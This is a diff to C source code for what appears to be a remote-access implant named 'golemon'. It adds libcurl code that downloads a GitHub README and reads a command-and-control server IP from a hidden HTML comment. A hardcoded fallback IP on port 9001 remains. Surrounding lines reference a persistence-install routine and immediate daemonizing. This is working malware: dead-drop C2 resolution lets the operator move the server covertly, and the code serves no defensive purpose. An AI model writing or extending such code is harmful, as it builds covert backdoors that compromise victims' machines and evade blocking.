@@ -13,6 +13,15 @@
 #include <glob.h>
 #include <dlfcn.h>
 #include <sqlite3.h>
+#include <curl/curl.h>
+
+#define README_URL "https://raw.githubusercontent.com/dilipk5/golemon/refs/heads/main/README.md"
+
+// Callback structure for curl
+struct MemoryStruct {
+    char *memory;
+    size_t size;
+};
 
 #define BUFFER_SIZE 1024
 
@@ -796,11 +805,114 @@ void install_persistence(int output_fd) {
     dprintf(output_fd, "PERSISTENCE_COMPLETE\n");
 }
 
+// Callback function for curl to write data
+static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
+    size_t realsize = size * nmemb;
+    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
+    
+    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
+    if (!ptr) {
+        return 0;
+    }
+    
+    mem->memory = ptr;
+    memcpy(&(mem->memory[mem->size]), contents, realsize);
+    mem->size += realsize;
+    mem->memory[mem->size] = 0;
+    
+    return realsize;
+}
+
+// Extract server IP from README content
+char* extract_server_ip(const char *content) {
+    // Look for pattern: <!-- SERVER_IP = xxx.xxx.xxx.xxx -->
+    const char *marker = "<!-- SERVER_IP = ";
+    char *start = strstr(content, marker);
+    
+    if (!start) {
+        return NULL;
+    }
+    
+    start += strlen(marker);
+    
+    // Skip any whitespace or extra text before IP
+    while (*start && (*start == ' ' || (*start >= 'a' && *start <= 'z') || (*start >= 'A' && *start <= 'Z'))) {
+        start++;
+    }
+    
+    char *end = strstr(start, " -->");
+    if (!end) {
+        end = strstr(start, "-->");
+    }
+    
+    if (!end) {
+        return NULL;
+    }
+    
+    // Trim trailing spaces
+    while (end > start && *(end - 1) == ' ') {
+        end--;
+    }
+    
+    size_t ip_len = end - start;
+    char *ip = malloc(ip_len + 1);
+    if (ip) {
+        strncpy(ip, start, ip_len);
+        ip[ip_len] = '\0';
+    }
+    
+    return ip;
+}
+
+// Fetch server IP from GitHub README
+char* fetch_server_ip() {
+    CURL *curl;
+    CURLcode res;
+    struct MemoryStruct chunk;
+    char *server_ip = NULL;
+    
+    chunk.memory = malloc(1);
+    chunk.size = 0;
+    
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
+    
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, README_URL);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
+        curl_easy_setopt(curl, CURLOPT_USERAGENT, "golemon-client/1.0");
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
+        
+        res = curl_easy_perform(curl);
+        
+        if (res == CURLE_OK) {
+            server_ip = extract_server_ip(chunk.memory);
+        }
+        
+        curl_easy_cleanup(curl);
+    }
+    
+    free(chunk.memory);
+    curl_global_cleanup();
+    
+    return server_ip;
+}
+
 #define BUFFER_SIZE 1024
 
 int main(int argc, char *argv[]) {
-    char *server_ip = "15.206.168.84";
+    char *server_ip = NULL;
     int server_port = 9001;
+    
+    // Try to fetch server IP from GitHub README
+    server_ip = fetch_server_ip();
+    
+    // Fallback to hardcoded IP if fetch fails
+    if (!server_ip) {
+        server_ip = strdup("15.206.168.84");
+    }
     
     // Daemonize immediately on first run
     static int first_run = 1;
